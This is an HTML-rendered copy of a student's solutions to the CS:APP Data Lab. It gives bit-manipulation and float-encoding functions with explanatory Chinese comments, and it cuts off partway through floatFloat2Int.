class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * CS:APP Data Lab </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Please put your name and userid here&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * bits.c - Source file with your solutions to the Lab.</span></span><br><span class="line"><span class="comment"> *          This is the file you will hand in to your instructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Do not include the &lt;stdio.h&gt; header; it confuses the dlc</span></span><br><span class="line"><span class="comment"> * compiler. You can still use printf for debugging without including</span></span><br><span class="line"><span class="comment"> * &lt;stdio.h&gt;, although you might get a compiler warning. In general,</span></span><br><span class="line"><span class="comment"> * it's not good practice to ignore compiler warnings, but in this</span></span><br><span class="line"><span class="comment"> * case it's OK.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Instructions to Students:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * STEP 1: Read the following instructions carefully.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">You will provide your solution to the Data Lab by</span><br><span class="line">editing the collection of functions in this source file.</span><br><span class="line"></span><br><span class="line">INTEGER CODING RULES:</span><br><span class="line"> </span><br><span class="line">  Replace the <span class="string">"return"</span> statement in each function with one</span><br><span class="line">  or more lines of C code that implements the function. Your code </span><br><span class="line">  must conform to the following style:</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> <span class="title function_">Funct</span><span class="params">(arg1, arg2, ...)</span> {</span><br><span class="line">      <span class="comment">/* brief description of how your implementation works */</span></span><br><span class="line">      <span class="type">int</span> var1 = Expr1;</span><br><span class="line">      ...</span><br><span class="line">      <span class="type">int</span> varM = ExprM;</span><br><span class="line"></span><br><span class="line">      varJ = ExprJ;</span><br><span class="line">      ...</span><br><span class="line">      varN = ExprN;</span><br><span class="line">      <span class="keyword">return</span> ExprR;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  Each <span class="string">"Expr"</span> is an expression using ONLY the following:</span><br><span class="line">  <span class="number">1.</span> Integer constants <span class="number">0</span> through <span class="number">255</span> (<span class="number">0xFF</span>), inclusive. You are</span><br><span class="line">      not allowed to use big constants such as <span class="number">0xffffffff</span>.</span><br><span class="line">  <span class="number">2.</span> Function arguments and local <span class="title function_">variables</span> <span class="params">(no global variables)</span>.</span><br><span class="line">  3. Unary integer operations ! ~</span><br><span class="line">  4. Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line">    </span><br><span class="line">  Some of the problems <span class="keyword">restrict</span> the <span class="built_in">set</span> of allowed operators even further.</span><br><span class="line">  Each "Expr" may consist of multiple operators. You are not restricted to</span><br><span class="line">  one operator per line.</span><br><span class="line"></span><br><span class="line">  You are expressly forbidden to:</span><br><span class="line">  1. Use any control constructs such as <span class="keyword">if</span>, <span class="keyword">do</span>, <span class="keyword">while</span>, <span class="keyword">for</span>, <span class="keyword">switch</span>, etc.</span><br><span class="line">  2. Define or use any macros.</span><br><span class="line">  3. Define any additional functions in this file.</span><br><span class="line">  4. Call any functions.</span><br><span class="line">  5. Use any other operations, such as &amp;&amp;, ||, -, or ?:</span><br><span class="line">  6. Use any form of casting.</span><br><span class="line">  7. Use any data type other than <span class="type">int</span>.  This implies that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  You may assume that your machine:</span><br><span class="line">  1. Uses 2s complement, 32-bit representations of integers.</span><br><span class="line">  2. Performs right shifts arithmetically.</span><br><span class="line">  3. Has unpredictable behavior when shifting <span class="keyword">if</span> the shift amount</span><br><span class="line">     is less than 0 or greater than 31.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXAMPLES OF ACCEPTABLE CODING STYLE:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus1</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; x) + <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus4</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="type">int</span> result = (<span class="number">1</span> &lt;&lt; x);</span><br><span class="line">     result += <span class="number">4</span>;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">FLOATING POINT CODING RULES</span><br><span class="line"></span><br><span class="line">For the problems that require you to implement floating-point operations,</span><br><span class="line">the coding rules are less strict.  You are allowed to use looping and</span><br><span class="line">conditional control.  You are allowed to use both ints and unsigneds.</span><br><span class="line">You can use arbitrary integer and <span class="type">unsigned</span> constants. You can use any arithmetic,</span><br><span class="line">logical, or comparison operations on <span class="type">int</span> or <span class="type">unsigned</span> data.</span><br><span class="line"></span><br><span class="line">You are expressly forbidden to:</span><br><span class="line">  <span class="number">1.</span> Define or use any macros.</span><br><span class="line">  <span class="number">2.</span> Define any additional functions in this file.</span><br><span class="line">  <span class="number">3.</span> Call any functions.</span><br><span class="line">  <span class="number">4.</span> Use any form of casting.</span><br><span class="line">  <span class="number">5.</span> Use any data type other than <span class="type">int</span> or <span class="type">unsigned</span>.  This means that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line">  <span class="number">6.</span> Use any floating point data types, operations, or constants.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTES:</span><br><span class="line">  <span class="number">1.</span> Use the <span class="title function_">dlc</span> <span class="params">(data lab checker)</span> <span class="title function_">compiler</span> <span class="params">(described in the handout)</span> to </span><br><span class="line">     check the legality of your solutions.</span><br><span class="line">  2. Each function has a maximum number of <span class="title function_">operations</span> <span class="params">(integer, logical,</span></span><br><span class="line"><span class="params">     or comparison)</span> that you are allowed to use <span class="keyword">for</span> your implementation</span><br><span class="line">     of the function.  The max operator count is checked by dlc.</span><br><span class="line">     Note that <span class="title function_">assignment</span> <span class="params">(<span class="string">'='</span>)</span> is not counted; you may use as many of</span><br><span class="line">     these as you want without penalty.</span><br><span class="line">  <span class="number">3.</span> Use the btest test harness to check your functions <span class="keyword">for</span> correctness.</span><br><span class="line">  <span class="number">4.</span> Use the BDD checker to formally verify your functions</span><br><span class="line">  <span class="number">5.</span> The maximum number of ops <span class="keyword">for</span> each function is given in the</span><br><span class="line">     header comment <span class="keyword">for</span> each function. If there are any inconsistencies </span><br><span class="line">     between the maximum ops in the writeup and in this file, consider</span><br><span class="line">     this file the authoritative source.</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * STEP 2: Modify the following functions according the coding rules.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   IMPORTANT. TO AVOID GRADING SURPRISES:</span></span><br><span class="line"><span class="comment"> *   1. Use the dlc compiler to check that your solutions conform</span></span><br><span class="line"><span class="comment"> *      to the coding rules.</span></span><br><span class="line"><span class="comment"> *   2. Use the BDD checker to formally verify that your solutions produce </span></span><br><span class="line"><span class="comment"> *      the correct answers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">  <span class="comment">//数字逻辑异或的与非转换</span></span><br><span class="line">  <span class="keyword">return</span> ~((~((~x)&amp;y))&amp;(~(x&amp;(~y))));</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">   <span class="comment">//最小的数是仅有最高有效位为1的数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two's complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//返回真值,关键在于将满足条件的数(即最大数)唯一地处理成0</span></span><br><span class="line">  <span class="comment">//利用xor比较是否相等</span></span><br><span class="line">  <span class="comment">//最大数+1和取反相同:!((~x)^(x+1));  但是-1同样有这一性质,要扣掉</span></span><br><span class="line">  <span class="comment">//利用!将数值转换为布尔值,再结合&amp;实现&amp;&amp;的功能</span></span><br><span class="line">  <span class="comment">//如果有移位操作:!((~x)^(1&lt;&lt;31))</span></span><br><span class="line">  <span class="type">int</span> x_plus_1 = x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (!((~x) ^ (x_plus_1)))&amp;(!!(x_plus_1));</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//类似掩码吧</span></span><br><span class="line">  <span class="type">int</span> all = <span class="number">0xAA</span>+(<span class="number">0xAA</span>&lt;&lt;<span class="number">8</span>)+(<span class="number">0xAA</span>&lt;&lt;<span class="number">16</span>)+(<span class="number">0xAA</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line">  <span class="keyword">return</span> !((x&amp;all)^all);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//负数补码:绝对值取反+1</span></span><br><span class="line">  <span class="comment">//反过来正数求相反数:-1再取反</span></span><br><span class="line">  <span class="comment">//不过~(x-1)==(~x)+1</span></span><br><span class="line">  <span class="keyword">return</span> (~x)+<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//该范围的有效位位:110000-111001</span></span><br><span class="line">  <span class="comment">//前两位及更高位固定不变,单独异或验证</span></span><br><span class="line">  <span class="comment">//末4位采用4位溢出的方式验证</span></span><br><span class="line">  <span class="type">int</span> bool1 = (x&gt;&gt;<span class="number">4</span>)^<span class="number">3</span>;</span><br><span class="line">  <span class="type">int</span> last_byte = x&amp;<span class="number">15</span>;</span><br><span class="line">  <span class="type">int</span> bool2 = (last_byte+<span class="number">6</span>)&amp;<span class="number">16</span>;</span><br><span class="line">  <span class="keyword">return</span> !bool1&amp;!bool2;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> {</span><br><span class="line">  <span class="comment">//将x转换成0和-1,与x,y进行&amp;.(1会清空高位,选用-1保留所有位)</span></span><br><span class="line">  <span class="comment">//从flag1-&gt;flag2: 0异或任何数等于任何数,-1异或-1为0.实现0和-1的转化</span></span><br><span class="line">    <span class="type">int</span> flag1 = (~!!x) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> flag2 = flag1 ^ (~<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> (flag1 &amp; y) | (flag2 &amp; z);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">  <span class="comment">//若不考虑溢出,则检测x-y的符号位</span></span><br><span class="line">  <span class="comment">//考虑溢出,因为溢出仅在x负y正和x正y负的情况下出现,而这两种情况又可直接比较大小,单独设置flag判断</span></span><br><span class="line">  <span class="type">int</span> mask = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> var1 = !(x&amp;mask);</span><br><span class="line">  <span class="type">int</span> var2 = !(y&amp;mask);</span><br><span class="line">  <span class="type">int</span> flag1 = !var1&amp;var2;</span><br><span class="line">  <span class="type">int</span> flag2 = !var2&amp;var1;</span><br><span class="line">  <span class="type">int</span> x_sub_y = x+(~y)+<span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> negate_SF = !((mask)&amp;x_sub_y);</span><br><span class="line">  <span class="comment">//感觉应该能化简..</span></span><br><span class="line">  <span class="keyword">return</span> (!negate_SF|!x_sub_y|flag1)&amp;!flag2;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//4</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">// (-x|x),若不为零,该值符号位必为1.</span></span><br><span class="line">    <span class="keyword">return</span> (~((((~x)+<span class="number">1</span>)|x)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>)^<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two's complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//二分法,若为负找最高0,若为正找最高1</span></span><br><span class="line">    <span class="type">int</span> flag, cnt_16, cnt_8, cnt_4, cnt_2, cnt_1, cnt_0;</span><br><span class="line">    <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    x = (sign &amp; (~x)) | (~sign &amp; (x));</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    cnt_16 = flag &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    x &gt;&gt;= (cnt_16);</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cnt_8 = flag &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    x &gt;&gt;= (cnt_8);</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    cnt_4 = flag &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    x &gt;&gt;= cnt_4;</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    cnt_2 = flag &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    x &gt;&gt;= cnt_2;</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    cnt_1 = flag;</span><br><span class="line">    x &gt;&gt;= cnt_1;</span><br><span class="line">    cnt_0 = x;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + cnt_0 + cnt_1 + cnt_2 + cnt_4 + cnt_8 + cnt_16;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span><br><span class="line">{</span><br><span class="line">  <span class="comment">//分别处理三部分,*2就是exp+1;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &lt;&lt; <span class="number">1</span> &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    <span class="type">unsigned</span> frac = uf &lt;&lt; <span class="number">9</span> &gt;&gt; <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> mask = uf &gt;&gt; <span class="number">31</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">255</span> &amp;&amp; frac)</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt;= <span class="number">254</span>)</span><br><span class="line">        <span class="keyword">return</span> mask| <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> mask | uf &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">exp</span>++;</span><br><span class="line">    <span class="keyword">return</span> mask|(<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|frac;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> {</span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="type">int</span> sign = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;</span><br><span class="line">    <span class="type">int</span> shiftBits = <span 